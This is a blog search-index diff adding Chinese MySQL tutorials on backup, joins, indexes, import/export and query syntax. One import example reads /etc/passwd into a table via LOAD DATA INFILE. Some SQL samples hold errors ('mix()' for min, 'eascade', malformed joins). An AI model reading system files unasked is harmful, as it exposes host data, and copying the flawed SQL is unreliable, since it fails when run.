class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p 源库名 &gt; 路径&#x2F;xxx.sql</span><br></pre></td></tr></table></figure></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db2 &gt; &#x2F;root&#x2F;db2.sql</span><br></pre></td></tr></table></figure></li><li>源库名的表示方式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--all-databases#备份所有库</span><br><span class="line">库名#备份单个库</span><br><span class="line">-B 库1 库2 ...#备份多个库</span><br><span class="line">库名 表1 表2 ...#备份指定库的指定表</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a><strong>数据恢复</strong></h4><ul><li><p>命令格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p 目标库名 &lt; 路径&#x2F;xxx.sql</span><br></pre></td></tr></table></figure></li><li><p>示例</p><ul><li>先备份库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db2 &gt; db2.sql</span><br></pre></td></tr></table></figure></li><li>删除库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database db2;</span><br></pre></td></tr></table></figure></li><li>先创建空库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database db2 default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure></li><li>恢复命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p db2 &lt; db2.sql</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>备份分为 完全备份 和 增量备份</strong></p><ul><li>完全备份: mysqldump</li><li>增量备份: binlog日志, xbackup工具</li></ul></li><li><p><strong>从所有库的备份文件中恢复某一个库</strong> (–one-database)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p --one-database 目标库名 &lt; all_mysql.sql</span><br><span class="line">mysql -uroot -p --one-database db2 &lt; all_mysql.sql</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>恢复库时库中新增的表不会删除</li><li>恢复时必须先创建空库</li></ul></li></ul></li></ul><h4 id="事务和事务回滚"><a href="#事务和事务回滚" class="headerlink" title="事务和事务回滚"></a><strong>事务和事务回滚</strong></h4><ul><li><p>定义</p><ul><li>一件事从开始发生到结束的整个过程</li></ul></li><li><p>作用</p><ul><li>确保数据的一致性</li></ul></li><li><p>事务和事务回滚的应用</p><pre><code>* mysql中默认sql语句会自动commit到数据库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;autocommit&quot;;</span><br></pre></td></tr></table></figure>* 开启事务    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start transaction;</span><br><span class="line">mysql&gt; ... SQL命令</span><br><span class="line"># 此时autocommit被禁用,SQL命令不会对数据库中数据做修改</span><br></pre></td></tr></table></figure>* 终止事务    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; commit;</span><br><span class="line">#或者回滚</span><br><span class="line">mysql&gt; rollback;</span><br></pre></td></tr></table></figure>* 注意    * 事务回滚rollback只针对于对表记录的操作,增,删,改,对创建库,创建表的操作无效</code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> mysqldump </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL高级查询语法</title>
+      <link href="/2014/05/09/MySQL/MySQL%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2/"/>
+      <url>/2014/05/09/MySQL/MySQL%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2/</url>
+      
+        <content type="html"><![CDATA[<h4 id="嵌套查询-子查询"><a href="#嵌套查询-子查询" class="headerlink" title="嵌套查询 (子查询)"></a><strong>嵌套查询</strong> (子查询)</h4><ul><li>定义<ul><li>把内层的查询结果作为外层的查询条件</li></ul></li><li>示例<ul><li>把uid的值小于 uid 平均值的用户和uid号显示出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select username,uid from userinfo</span><br><span class="line">where uid &lt; (select avg(uid) from userinfo);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a><strong>连接查询</strong></h4><ul><li><p><strong>内连接</strong></p><ul><li>定义<ul><li>从表中删除与其它被连接的表中没有匹配到的行</li></ul></li><li>语法格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表1</span><br><span class="line">inner join 表2 on 条件 inner join 表3 条件;</span><br></pre></td></tr></table></figure></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#显示省市详细信息</span><br><span class="line">select sheng.s_name,city.c_name from sheng</span><br><span class="line">inner join city</span><br><span class="line">on sheng.s_id &#x3D; city.cfather_id;</span><br><span class="line"></span><br><span class="line">#显示省市县详细信息</span><br><span class="line">select sheng.s_name,city.c_name.xian.x_name from sheng</span><br><span class="line">inner join city on sheng.s_id&#x3D;city.cfather_id</span><br><span class="line">inner join xian on city.c_id&#x3D;xian.xfather_id;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>外连接</strong></p><ul><li>左连接<ul><li>定义<ul><li>以左表为主显示查询结果</li></ul></li><li>语法格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表1</span><br><span class="line">left join 表2 on 条件;</span><br></pre></td></tr></table></figure></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select sheng.s_name,city.c_name from sheng</span><br><span class="line">left join city</span><br><span class="line">on sheng.s_id&#x3D;city.cfather_id;</span><br><span class="line"></span><br><span class="line">select sheng.s_name,city.c_name.xian.x_name from sheng</span><br><span class="line">left join city on sheng.s_id&#x3D;city.cfather_id</span><br><span class="line">left join city on city.c_id&#x3D;xian.xfather_id;</span><br></pre></td></tr></table></figure></li></ul></li><li>右连接<ul><li>定义<ul><li>用法同左连接,以右表为主显示查询结果</li></ul></li></ul></li></ul></li></ul><h4 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a><strong>多表查询</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表名列表;#笛卡尔积</span><br><span class="line">select 字段名列表 from 表名列表 where 条件;</span><br><span class="line">#等同于 内连接 inner join</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> SQL查询 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL索引及数据导入导出</title>
+      <link href="/2014/05/07/MySQL/MySQL%E7%B4%A2%E5%BC%95%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"/>
+      <url>/2014/05/07/MySQL/MySQL%E7%B4%A2%E5%BC%95%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
+      
+        <content type="html"><![CDATA[<h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a><strong>索引</strong></h4><ul><li><p>定义</p><ul><li>对数据库中表的一列或者多列的值进行排序的一种结构(MySQL中索引用Btree方式)</li></ul></li><li><p>索引的优点</p><ul><li>可以加快数据的检索速度</li></ul></li><li><p>索引的缺点</p><ul><li>当对表中的数据进行增加,修改,删除的时候,索引需要动态维护,降低了数据的维护速度</li><li>索引需要占用物理存储空间(数据库目录/var/lib/mysql)</li></ul></li><li><p><strong>索引性能分析</strong></p><ul><li>开启性能分析: set profiling = 1</li><li>执行SQL命令:</li><li>查看性能分析结果: show profiles;</li><li>创建索引字段: <code>create index 索引名 on 表名(字段名);</code></li><li>执行SQL命令:</li><li>查看性能分析结果: show profiles;</li></ul></li></ul><h5 id="索引分类"><a href="#索引分类" class="headerlink" title="索引分类"></a><strong>索引分类</strong></h5><ol><li><p><strong>普通索引</strong>(index)</p><ul><li><p>使用规则</p><ul><li>一个表中可以有多个index字段</li><li>字段的值可以有重复,也可以为NULL值</li><li>经常把做查询条件的字段设置为index字段</li><li>index字段的key标志为:MUL</li></ul></li><li><p>创建</p><ul><li>创建表时创建index  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table t1(</span><br><span class="line">... ...,</span><br><span class="line">... ...,</span><br><span class="line">index(id)</span><br><span class="line">index(name));</span><br></pre></td></tr></table></figure></li><li>在已有表中添加索引字段  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create index 索引名 on 表名(字段名);</span><br><span class="line"># 索引名一般和字段名一样,也可以随便</span><br></pre></td></tr></table></figure></li></ul></li><li><p>查看普通索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;#查看key标志为MUL</span><br><span class="line">show index from 表名\G;#查看详细信息</span><br></pre></td></tr></table></figure></li><li><p>删除索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index 索引名 on 表名;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>删除普通索引只能一个一个删除</li></ul></li></ul></li></ul></li><li><p><strong>唯一索引</strong></p><ul><li><p>使用规则</p><ul><li>一个表中可以有多个unique字段</li><li>unique字段的值不允许重复,可以为空值NULL</li><li>unique的KEY标志是 UNI</li></ul></li><li><p>创建(基本等同index创建)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table t1(</span><br><span class="line">... ...,</span><br><span class="line">... ...,</span><br><span class="line">unique(id)</span><br><span class="line">unique(name));</span><br></pre></td></tr></table></figure></li><li><p>已有表中创建</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create unique index 索引名 on 表名(字段名);</span><br></pre></td></tr></table></figure></li><li><p>查看,删除唯一索引</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">desc 表名;</span><br><span class="line">show index from 表名;</span><br><span class="line">drop index 索引名 on 表名;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>主键索引</strong> (primary key) &amp;&amp; 自增长属性(auto_increment)</p><ul><li>使用规则<ul><li>一个表中只能有一个主键字段</li><li>对应字段的值不允许重复且不能为空值NULL</li><li>主键字段的KEY标志为 PRI</li><li>把表中能够唯一标识一条记录的字段设置为主键,通常把表中记录编号的字段设置为主键</li></ul></li><li>创建主键(PRI)<ul><li>创建表时创建  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字段名 数据类型 primary key auto_increment,</span><br><span class="line"></span><br><span class="line">id int auto_increment,</span><br><span class="line">... ...,</span><br><span class="line">primary key(id,name)#复合主键</span><br></pre></td></tr></table></figure></li><li>删除主键<ul><li>先删除自增长属性(modify)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify id int primary key;</span><br></pre></td></tr></table></figure></li><li>删除主键<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop primary key;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>在已有表中添加主键  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 add primary key(字段名);</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>外键索引</strong></p><ul><li><p>定义</p><ul><li>让当前表字段的值在另一个表的范围内选择</li></ul></li><li><p>语法格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreign key(参考字段名)</span><br><span class="line">references 被参考表名(被参考字段名)</span><br><span class="line">on delete 级联动作</span><br><span class="line">on update 级联动作</span><br></pre></td></tr></table></figure></li><li><p>级联动作</p><ul><li>eascade : 数据级联更新<ul><li>当主表删除记录或者更新被参考字段的值时,从表会级联更新</li></ul></li><li>restrict 默认<ul><li>当删除主表记录时,如果从表中有相关联记录则不允许主表删除</li><li>更新同理</li></ul></li><li>set null<ul><li>当主表删除记录时,从表中相关联记录的字段值自动设置为NULL</li><li>更新同理</li></ul></li><li>no action  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">on delete no action on update no action</span><br><span class="line"># 同 restrict,都是立即检查外键限制</span><br></pre></td></tr></table></figure></li></ul></li><li><p>删除外键</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 drop foreign key 外键名;</span><br></pre></td></tr></table></figure><ul><li>外键名的查看方式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create table 表名;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>已有表中添加外键</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 会受到表中原有数据的限制</span><br><span class="line">alter table 表名 add foreign key(参考字段名)</span><br><span class="line">references 被参考表名(被参考字段名)</span><br><span class="line">on delete 级联动作</span><br><span class="line">on update 级联动作;</span><br></pre></td></tr></table></figure></li><li><p>外键使用规则</p><ul><li>两张表被参考字段和参考字段数据类型要一致</li><li>被参考字段必须是 key 的一种,通常是 primary key</li></ul></li></ul></li></ol><h4 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a><strong>数据导入</strong></h4><ul><li>作用: 把文件系统的内容导入到数据库中<ul><li>语法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;文件名&quot;</span><br><span class="line">into table 表名</span><br><span class="line">fields terminated by &quot;分隔符&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;</span><br></pre></td></tr></table></figure></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">把 &#96;&#x2F;etc&#x2F;passwd&#96; 文件中的内容导入到db2库下的userinfo表</span><br><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">用户名:密码:UID号:GID号:用户描述:用户家目录:登录权限</span><br></pre></td></tr></table></figure></li><li>操作步骤<ul><li>在数据库中创建对应的表<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo(</span><br><span class="line">username char(20),</span><br><span class="line">password char(1),</span><br><span class="line">uid int,</span><br><span class="line">gid int,</span><br><span class="line">comment varchar(50),</span><br><span class="line">homedir varchar(50),</span><br><span class="line">shell varchar(50)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul></li><li>将要导入的文件拷贝到数据库的默认搜索路径中<ul><li>查看数据库的默认搜索路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql-files</span><br><span class="line"></span><br><span class="line">sudo cp &#x2F;etc&#x2F;passwd &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F;</span><br></pre></td></tr></table></figure></li><li>执行数据导入语句<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot;</span><br><span class="line">into table userinfo</span><br><span class="line">fields terminated by &quot;:&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a><strong>数据导出</strong></h4><ul><li>作用<ul><li>将数据库表中的记录保存到系统文件里</li></ul></li><li>语法格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select ... from 表名</span><br><span class="line">into outfile &quot;文件名&quot;</span><br><span class="line">fields terminated by &quot;分割符&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure></li><li>把userinfo表中的username,password和uid导出到文件user.txt  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select username,password,uid from userinfo</span><br><span class="line">into outfile &quot;&#x2F;tmp&#x2F;user.txt&quot;</span><br><span class="line">fields terminated by &quot;,&quot;</span><br><span class="line">lines terminated by &quot;\n&quot;;</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>导出的内容由SQL查询语句决定</li><li>执行导出命令时路径必须指定对应的数据库搜索路径</li></ul></li></ul></li></ul><h4 id="表的复制"><a href="#表的复制" class="headerlink" title="表的复制"></a><strong>表的复制</strong></h4><ul><li><p>语法格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名 select 查询命令;</span><br></pre></td></tr></table></figure></li><li><p>示例</p><ul><li>复制userinfo表中的全部记录到userinfo2<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo2 select * from userinfo;</span><br></pre></td></tr></table></figure></li><li>复制userinfo表中username,password,uid三个字段的第2-10条纪录到userinfo3<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table userinfo3 select username,password,uid from userinfo limit 1,9;</span><br></pre></td></tr></table></figure></li><li>复制表结构<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名 select 查询命令 where false;</span><br></pre></td></tr></table></figure></li><li>注意<ul><li>复制表的时候不会把原有表的key属性复制过来</li></ul></li></ul></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> DBMS </category>
+          
+          <category> MySQL </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mysql </tag>
+            
+            <tag> SQL查询 </tag>
+            
+            <tag> 索引 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SQLMAP自动注入参数详解</title>
       <link href="/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
       <url>/2014/05/06/Web_Attacks/SQL_Injection/SQLMAP%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5/</url>
@@ -2878,6 +3033,37 @@
             <tag> SQL注入 </tag>
             
             <tag> sqlmap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MySQL条件子句及查询语法</title>
+      <link href="/2014/05/06/MySQL/MySQL%E6%9D%A1%E4%BB%B6%E5%AD%90%E5%8F%A5%E5%8F%8A%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95/"/>
+      <url>/2014/05/06/MySQL/MySQL%E6%9D%A1%E4%BB%B6%E5%AD%90%E5%8F%A5%E5%8F%8A%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<ul><li><strong>字符类型的宽度和数值类型的宽度的区别</strong><ul><li>数值类型的宽度仅仅为显示宽度,只用于select查询显示,和占用的存储空间大小无关,可用zerofill查看效果</li><li>字符类型的宽度超过则无法存储</li></ul></li></ul><h4 id="where条件子句-配合查询-修改-删除操作"><a href="#where条件子句-配合查询-修改-删除操作" class="headerlink" title="where条件子句 (配合查询,修改,删除操作)"></a><strong>where条件子句</strong> (配合查询,修改,删除操作)</h4><p><strong>查询语法</strong><br><code>select * from 表名 where 条件;</code></p><p><strong>表记录管理</strong></p><ul><li>删除表记录<ul><li><code>delete from 表名 where 条件;</code></li><li>注意<ul><li>delete语句后如果不加where条件子句,会将表中所有记录全部删除</li></ul></li></ul></li><li>更新表记录<ul><li><code>update 表名 set 字段名1=值1,字段名2=值2,... where 条件;</code></li></ul></li></ul><h4 id="运算符操作"><a href="#运算符操作" class="headerlink" title="运算符操作"></a><strong>运算符操作</strong></h4><ul><li>数值比较运算符: <code>=,!=,&gt;,&gt;=,&lt;,&lt;=</code></li><li>字符比较运算符: <code>=, !=</code></li></ul><h4 id="逻辑比较"><a href="#逻辑比较" class="headerlink" title="逻辑比较"></a><strong>逻辑比较</strong></h4><ul><li>运算符:<ul><li>and (两个或多个条件同时满足)</li><li>or  (两个或者多个条件有一个满足就可以)</li></ul></li></ul><h4 id="范围内比较"><a href="#范围内比较" class="headerlink" title="范围内比较"></a><strong>范围内比较</strong></h4><ul><li>运算符:<ul><li>between and</li><li>in</li><li>not in </li></ul></li><li>语法:  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">between 值1 and 值2</span><br><span class="line"></span><br><span class="line">in(值1,值2,...值N)</span><br><span class="line"></span><br><span class="line">not in(值1,值2,...,值N)</span><br></pre></td></tr></table></figure></li></ul><h4 id="匹配空和非空"><a href="#匹配空和非空" class="headerlink" title="匹配空和非空"></a><strong>匹配空和非空</strong></h4><ul><li><p>空: <code>is null</code></p></li><li><p>非空: <code>is not null</code></p></li><li><p><strong>注意</strong></p><ul><li>null: 空值,必须用 is 或者 is not 去匹配</li><li>“” : 空字符串,用 = 或者 != 去匹配</li></ul></li></ul><h4 id="模糊比较"><a href="#模糊比较" class="headerlink" title="模糊比较"></a><strong>模糊比较</strong></h4><ul><li><code>select 字段名 from 表名 where 字段名 like 表达式;</code></li><li>表达式<ul><li>_ : 匹配单个字符</li><li>% : 匹配0到多个字符</li></ul></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select name from sanguo where name like &quot;_%_&quot;;</span><br><span class="line">select name from sanguo where name like &quot;%&quot;;#null值不会被统计</span><br><span class="line">select name from sanguo where name like &quot;___&quot;;</span><br><span class="line">select name from sanguo where name like &quot;张%&quot;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="正则匹配查询-regexp"><a href="#正则匹配查询-regexp" class="headerlink" title="正则匹配查询 regexp"></a><strong>正则匹配查询</strong> regexp</h4><ul><li><p><code>where 字段名 regexp &quot;正则表达式&quot;;</code></p></li><li><p>正则表达式符号</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">^ : 以...开头</span><br><span class="line"></span><br><span class="line">$ : 以...结尾</span><br><span class="line"></span><br><span class="line">. : 匹配任意一个字符</span><br><span class="line"></span><br><span class="line">[]: 包含...内容 </span><br><span class="line">[0-9]: 匹配带数字的</span><br><span class="line">[a-z]: 匹配带小写字母的</span><br><span class="line">[A-Z]: 匹配带大写字母的</span><br><span class="line"></span><br><span class="line">* : 星号前面的字符出现0次或多次&quot;^张.*&quot;</span><br></pre></td></tr></table></figure></li><li><p>示例</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select name from sanguo where name regexp &quot;[0-9]&quot;;#匹配带数字的</span><br><span class="line">select name from sanguo where name regexp &quot;^[0-9]&quot;;#匹配名字中以数字开头的记录</span><br><span class="line">select name from sanguo where name regexp &quot;[0-9]$&quot;;#匹配名字中以数字结尾的记录</span><br><span class="line">select name from sanguo where name regexp &quot;^司.*懿$&quot;;#匹配以司开头以懿结尾中间可以是任意字符</span><br><span class="line">select name from sanguo where name regexp &quot;^...$&quot;;#....</span><br></pre></td></tr></table></figure></li></ul><h4 id="SQL查询"><a href="#SQL查询" class="headerlink" title="SQL查询"></a><strong>SQL查询</strong></h4><ul><li><p>总结(执行顺序)</p><ol start="3"><li>select … 聚合函数 from 表名</li><li>where …</li><li>group by …</li><li>having …</li><li>order by …</li><li>limit …</li></ol></li><li><p><strong>order by</strong></p><ul><li>作用: 给查询的结果进行排序</li><li>语法格式: <code>order by 字段名 排序方式;</code></li><li>排序方式<ul><li>ASC(默认): 升序</li><li>DESC: 降序<ul><li>select * from sanguo order by fangyu asc;</li></ul></li></ul></li></ul></li><li><p><strong>limit</strong> (永远放在SQL语句的最后写)</p><ul><li>作用: 限制显示查询记录的个数</li><li>用法:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">limit n#显示n条记录</span><br><span class="line">limit m,n#从第(m+1)条开始,显示N条记录</span><br><span class="line">limit 4,5#显示5到10.</span><br><span class="line"># m的值是从0开始计数的</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>聚合函数</strong></p><ul><li>分类<ul><li>avg(字段名) : 求字段的平均值</li><li>sum(字段名) : 求和</li><li>max(字段名) : 求最大值</li><li>mix(字段名) : 求最小值</li><li>count(字段名) : 统计该字段记录的个数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select max(gongji) as best from sanguo;</span><br><span class="line">select count(id),count(name) from sanguo;</span><br><span class="line"># 空值NULL不会被统计,空字符串&quot;&quot;会被统计</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>group by</strong> (先分组再聚合)</p><ul><li>作用: 给查询的结果进行分组</li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select country from sanguo group by country;</span><br><span class="line">select country,avg(gongji) from sanguo group by country;</span><br><span class="line">select country,count(*) as numbers from sanguo group by country order by numbers desc limit 2;</span><br></pre></td></tr></table></figure></li><li>执行过程:<ul><li>先分组(此时未去重) <code>group by country</code></li><li>再聚合(求每组的平均攻击值)</li><li>去重</li></ul></li><li>注意<ul><li>group by之后的字段名必须要为select之后的字段名</li><li>如果select之后的字段没有在group 